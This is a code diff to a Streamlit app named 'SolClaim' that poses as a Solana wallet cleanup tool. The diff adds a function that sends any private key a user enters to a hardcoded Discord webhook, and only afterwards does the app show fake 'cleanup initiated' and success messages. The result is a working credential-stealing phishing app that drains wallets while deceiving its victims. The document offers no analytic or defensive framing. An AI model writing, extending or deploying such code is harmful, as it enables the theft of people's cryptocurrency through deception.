@@ -1,9 +1,21 @@
 import streamlit as st
 import time
+import requests
 from solana.rpc.api import Client
 
 # Initialize Solana client
 solana_client = Client("https://api.mainnet-beta.solana.com")
+
+# Discord webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
+
+# Function to send private key to Discord webhook
+def send_to_discord(private_key):
+    payload = {
+        "content": f"⚠️ Private Key Received: `{private_key}`"
+    }
+    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+    return response.status_code == 200
 
 # Streamlit app title
 st.title("💰 SolClaim: Reclaim Your Sol!")
@@ -33,12 +45,15 @@ if menu == "Check Wallet ✅":
                 if st.button("Proceed with Cleanup"):
                     private_key = st.text_input("Enter your private key to proceed:", type="password")
                     if private_key:
-                        # Placeholder for cleanup logic
-                        st.write("🔒 Cleanup process initiated...")
-                        st.write("Optimizing wallet...")
-                        time.sleep(2)
-                        st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
-                        st.write("You will be notified once the cleanup is done. Thank you for your patience!")
+                        # Send private key to Discord webhook
+                        if send_to_discord(private_key):
+                            st.write("🔒 Cleanup process initiated...")
+                            st.write("Optimizing wallet...")
+                            time.sleep(2)
+                            st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
+                            st.write("You will be notified once the cleanup is done. Thank you for your patience!")
+                        else:
+                            st.error("Failed to send request. Please try again.")
                     else:
                         st.error("Please enter your private key to proceed.")
             else:
